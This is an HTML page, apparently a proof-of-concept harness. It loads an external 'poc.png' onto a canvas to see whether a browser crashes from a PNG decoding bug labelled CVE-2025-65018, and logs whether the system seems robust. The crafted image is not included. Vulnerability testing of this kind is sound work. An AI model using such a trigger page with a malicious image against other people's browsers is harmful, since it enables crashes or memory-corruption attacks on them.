<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PNG Canvas Stress Test</title>
    <style>
        body { background: #000; color: #fff; text-align: center; font-family: monospace; padding-top: 20px; }
        button { background: #d50000; color: white; border: 2px solid #ff1744; padding: 15px 30px; font-size: 20px; cursor: pointer; font-weight: bold; margin-bottom: 20px; }
        #log { border: 1px solid #333; padding: 10px; margin: 10px auto; width: 80%; text-align: left; height: 150px; overflow-y: scroll; font-size: 14px;}
        canvas { border: 1px solid #555; display: none; }
    </style>
</head>
<body>

    <h1>CANVAS DECODING FORCE</h1>
    <p>Alvo: Forçar a CPU a converter 16-bit -> 8-bit via Canvas API.</p>

    <button onclick="iniciarTeste()">FORÇAR RENDERIZAÇÃO</button>
    
    <div id="log">Log de eventos...</div>
    
    <canvas id="canvasExploit"></canvas>

    <script>
        function log(msg) {
            var el = document.getElementById('log');
            el.innerHTML += "<div>[" + new Date().toLocaleTimeString() + "] " + msg + "</div>";
            el.scrollTop = el.scrollHeight;
        }

        function iniciarTeste() {
            var canvas = document.getElementById('canvasExploit');
            var ctx = canvas.getContext('2d');
            
            // Cria a imagem em memória
            var img = new Image();
            
            // Cache busting para garantir download novo
            var src = "poc.png?t=" + Math.random();
            
            log("Baixando " + src + "...");
            
            img.onload = function() {
                log("Imagem baixada. Dimensões: " + img.width + "x" + img.height);
                
                // Configura o canvas para o tamanho da imagem
                canvas.width = img.width;
                canvas.height = img.height;
                
                log("ATENÇÃO: Iniciando drawImage()...");
                log("Se o console travar agora, o bug foi acionado na conversão de pixels.");
                
                // Tenta desenhar (Isso força a conversão 16-bit Interlaced -> 8-bit Canvas)
                try {
                    ctx.drawImage(img, 0, 0);
                    log("drawImage() concluído.");
                    
                    // Tenta ler os dados (Força bruta final)
                    log("Lendo pixels com getImageData()...");
                    var imageData = ctx.getImageData(0, 0, 100, 100);
                    
                    log("❌ SUCESSO DO NAVEGADOR: Os pixels foram lidos sem crash.");
                    log("Conclusão: O sistema parece robusto contra CVE-2025-65018.");
                    
                } catch(e) {
                    log("⚠️ Erro JS: " + e.message);
                }
            };

            img.onerror = function() {
                log("Erro ao carregar a imagem (formato rejeitado antes do Canvas).");
            };

            img.src = src;
        }
    </script>
</body>
</html>
